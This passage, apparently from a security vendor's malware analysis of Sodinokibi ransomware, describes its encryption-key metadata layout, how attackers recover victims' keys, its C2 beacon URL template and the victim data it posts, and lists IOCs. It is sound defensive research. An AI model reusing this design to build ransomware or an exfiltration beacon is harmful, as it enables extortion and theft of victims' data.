+• Affiliate key metadata, stored in sk_key in registry (88 bytes):
+
+o victim’s main private key, encrypted using AES key derived from the hardcoded key from the config's "pk" value and the victim’s secondary public key (36 bytes)
+
+o victim’s secondary public key (from a second pair of curve25519 keys, 32 bytes)
+
+o randomly generated AES IV (16 bytes)
+
+o CRC32 of victim’s public key (4 bytes)
+
+• Master key metadata, stored in 0_key in registry (88 bytes):
+
+o victim’s main private key, encrypted using AES key derived from the hardcoded key from .data section and the victim’s tertiary public key
+
+o victim’s tertiary public key (from a third pair of curve25519 keys)
+
+o randomly generated AES IV
+
+o CRC32 of victim’s public key
+
+• Per-file generated public key (32 bytes)
+
+• Per-file generated random Salsa20 nonce (8 bytes)
+
+• CRC32 sum of per-file public key (4 bytes)
+
+• Value of fast setting from config (0 or 1) (4 bytes)
+
+• 0x0000 encrypted with per-file generated Salsa20 key (4 bytes)
+
+Figure 24: Information appended to the encrypted file
+
+All of the generated private keys, AES/Salsa keys, and shared secrets are zeroed-out in memory immediately after use to prevent the possibility of the victim retrieving any information that might help them recover their files.
+
+The attackers will be able to decrypt the victim’s main private key by applying the same curve25519 shared-key derivation algorithm to compute the AES key it was encrypted with. In order to do that, the attackers can either use the victim’s secondary public key and their own private key that corresponds to the public key from config's pk value, or use the victim’s tertiary public key and their own private key that corresponds to the public key from the binary's .data section. Having the victim’s main private key and all the metadata appended to the end of each file, they will now be able to derive the Salsa20 symmetric keys used to encrypt the files.
+
+Command and Control (C2) Communication
+
+By using an asymmetric key scheduling algorithm, Sodinokibi doesn’t depend on network communication in order to exchange encryption keys with the attackers. The malware can fully operate in offline mode without the risk of the victim retrieving the information needed for file decryption.
+
+It does however implement an optional functionality of reaching out to the C&C – if the net parameter is set in the configuration, a POST request containing the victim’s system information and encryption metadata will be broadcasted to a range of domains listed under the dmn value in the configuration. In most of the samples we saw, that list includes a huge number of legitimate looking domains, most of which seem to be WordPress sites.
+
+For each of these domains a pseudo-random URL will be created using the following format:
+
+
+
+https://<domain_from_cfg>/<str_from_list1>/<str_from_list2>/<rand_str>.<ext_from_list3>
+
+Figure 25: Dynamic URL generation template
+
+List 1 List 2 List 3 wp-content images jpg static pictures png content image gif include temp uploads tmp news graphic data assets admin pics games
+
+Figure 26: Extension list used in dynamic URL generation
+
+An example of a generated URL is shown in Figure 27:
+
+
+
+https[://]peppergreenfarmcatering[.]com[.]au/content/pictures/iiusng.jpg
+
+Figure 27: Generated URL example
+
+The POST request sent to each of these URLs contains the stat value from the registry which is made of the following information in JSON format, encrypted with AES-256-CTR with the key generated using curve25519 shared-key derivation algorithm, and SHA3-256:
+
+Value Content ver Malware version (0x102 hardcoded) pid Actor ID ("pid" from config) sub Campaign ID ("sub" from config) pk Attacker's public key ("pk" from config) uid Vicitm UID (cpuid_hash + volume_serial_nr) sk Content of sk_key value from registry (includes victim’s private key, generated at runtime and encrypted using AES key derived with the use of public key from config) unm Username net Computer name grp TCP/IP domain lng OS language bro True if keyboard layout code ends with specified codes os OS version (ProductName) bit CPU architecture dsk Disk free space (base64 encoded) ext Random file extension for encrypted files
+
+Figure 28: POST request custom fields
+
+The malware will read the response from the C&C, but it does not store it, or use it anywhere in the code, suggesting that its networking functionality is limited to sending out a beacon with the victim’s information.
+
+While some of the domains from the configuration might have been waterholed, it’s possible that the majority of them are included just as means of obfuscating the real C&C address.
+
+Conclusions
+
+Our analysis of Sodinokibi revealed several notable and surprising pieces of information. We observed attackers spreading the malware via MSSPs and Go2Assist, as well as using curve22519-based key exchange, perhaps a first for ransomware. We witnessed Sodinokibi transition between 32bit and 64bit operation using the Heaven’s Gate technique, while the C2 server was obfuscated in an impressive list of over a thousand pre-loaded domains.
+
+Our investigation also uncovered details about Sodinokibi that invite further speculation. The exploit code is more elegant than the coding of the main ransomware. This may indicate that the exploit code was purchased elsewhere rather than developed by the attackers. We also saw the blue screen of death (BSOD) during testing which may mean the exploit code is not entirely stable, and hence not routinely enabled in many configurations.
+
+For those wishing to avoid Sodinokibi attacks, BlackBerry Cylance trains artificial intelligence-based security agents on millions of both safe and unsafe files. This allows us to identify and prevent Sodinokibi based on countless file attributes and system behaviors instead of a specific file signature. BlackBerry Cylance, which offers a predictive advantage over zero-day threats, is effective against both new and legacy cyberattacks.
+
+IOCs
+
+Indicator Type Description 861bc212241bcac9f8095c8de1b180b398057cbb2d37c9220086ffaf24ba9e08 SHA256 Sodinokibi Global\206D87E0-0E60-DF25-DD8F-8E4E7D1E3BF0 Mutex Run-once mutex name Global\48ce5235-506a-49ee-999a-bee908c6aa17 Event Exploit mutex name [HKLM|HKCU]\SOFTWARE\recfg Registry key Config registry key [HKLM|HKCU]\SOFTWARE\recfg\0_key Registry vaue Master key metadata [HKLM|HKCU]\SOFTWARE\recfg\pk_key Registry value Victim’s main public key [HKLM|HKCU]\SOFTWARE\recfg\sk_key Registry value Affiliate key metadata [HKLM|HKCU]\SOFTWARE\recfg\sub_key Registry value Attacker's public key from config [HKLM|HKCU]\SOFTWARE\recfg\stat Registry value Machine information [HKLM|HKCU]\SOFTWARE\recfg\rnd_ext Registry value Random extension for encrypted files
+
+
+
+MITRE ATT&CK
